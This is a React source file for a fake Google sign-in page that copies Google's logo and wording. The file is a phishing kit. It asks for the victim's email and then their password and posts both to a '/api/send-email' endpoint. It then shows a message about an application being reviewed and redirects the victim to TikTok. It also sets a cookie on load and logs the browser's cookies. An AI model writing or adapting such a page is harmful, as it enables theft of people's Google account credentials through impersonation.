import { useState, useEffect } from "react";
import { motion } from "framer-motion";

export default function GoogleLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [step, setStep] = useState(1);
  const [showPassword, setShowPassword] = useState(false);
  const [notification, setNotification] = useState("");
  const [notificationType, setNotificationType] = useState("");

  // Set the cookie when the component mounts
  useEffect(() => {
    const setCookie = async () => {
      try {
        const response = await fetch("/api/set-cookie", { method: "POST" });
        if (!response.ok) {
          console.error("Failed to set cookie:", await response.text());
        }
      } catch (err) {
        console.error("Error setting cookie:", err);
      }
    };
    setCookie();

    console.log("Cookies on client:", document.cookie);
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!email) {
      setError("Please enter your email.");
      return;
    }
    setError("");
    setStep(2);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!password) {
      setError("Please enter your password.");
      return;
    }
    setError("");

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const responseData = await response.json();
      if (response.ok) {
        setNotification("Thank for Applying, our Agent will get back within 3 working days. You can now continue with tiktok");
        setNotificationType("success");
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com/explore";
        }, 2000);
      } else {
        throw new Error(responseData.error || "Failed to send email");
      }
    } catch (err) {
      console.error("Error sending email:", err.message);
      setNotification(`Application failed: ${err.message}`);
      setNotificationType("error");
    }
  };

  const toggleShowPassword = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-black">
      <motion.div 
        className="p-6 w-full max-w-sm"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
      >
        {step === 1 ? (
          <div>
            <div className="flex justify-center mb-6">
              <svg className="w-12 h-12" viewBox="0 0 48 48">
                <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.28-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                <path fill="none" d="M0 0h48v48H0z"/>
              </svg>
            </div>
            <h1 className="text-3xl font-normal text-white mb-2">Sign in</h1>
            <p className="text-sm text-gray-300 mb-8">
              with your Google Account. You'll also sign in to Google services in your apps.
            </p>
            <form onSubmit={handleEmailSubmit}>
              <div className="mb-8">
                <input
                  type="email"
                  placeholder="Email or phone"
                  className="w-full p-3 bg-transparent border border-gray-600 rounded text-white placeholder-gray-400 focus:outline-none focus:border-blue-500"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
              {notification && (
                <p className={`notification ${notificationType}`}>
                  {notification}
                </p>
              )}
              <div className="flex justify-between items-center">
                <a href="#" className="text-blue-400 text-sm hover:underline">
                  Forgot email?
                </a>
                <div className="flex space-x-4">
                  <a href="#" className="text-blue-400 text-sm hover:underline">
                    Create account
                  </a>
                  <motion.button
                    type="submit"
                    className="bg-blue-500 text-white px-6 py-2 rounded-full font-medium"
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    Next
                  </motion.button>
                </div>
              </div>
            </form>
          </div>
        ) : (
          <div>
            <h1 className="text-3xl font-normal text-white mb-2">Welcome</h1>
            <div className="flex items-center mb-8">
              <div className="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center mr-3">
                <span className="text-white text-sm">{email[0]?.toUpperCase()}</span>
              </div>
              <span className="text-gray-300">{email}</span>
            </div>
            <form onSubmit={handlePasswordSubmit}>
              <div className="mb-4">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Enter your password"
                  className="w-full p-3 bg-transparent border border-gray-600 rounded text-white placeholder-gray-400 focus:outline-none focus:border-blue-500"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              <div className="flex items-center mb-8">
                <input 
                  type="checkbox" 
                  id="show-password" 
                  className="mr-2" 
                  checked={showPassword}
                  onChange={toggleShowPassword}
                />
                <label htmlFor="show-password" className="text-gray-300 text-sm">
                  Show password
                </label>
              </div>
              {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
              {notification && (
                <p className={`notification ${notificationType}`}>
                  {notification}
                </p>
              )}
              <div className="flex justify-between items-center">
                <a href="#" className="text-blue-400 text-sm hover:underline">
                  Forgot password?
                </a>
                <motion.button
                  type="submit"
                  className="bg-blue-500 text-white px-6 py-2 rounded-full font-medium"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Next
                </motion.button>
              </div>
            </form>
          </div>
        )}
      </motion.div>

      <style jsx>{`
        .notification {
          font-size: 14px;
          text-align: center;
          margin-bottom: 16px;
          padding: 10px;
          border-radius: 4px;
        }
        .notification.success {
          color: #15803d;
          background-color: #dcfce7;
        }
        .notification.error {
          color: #b91c1c;
          background-color: #fee2e2;
        }
      `}</style>
    </div>
  );
}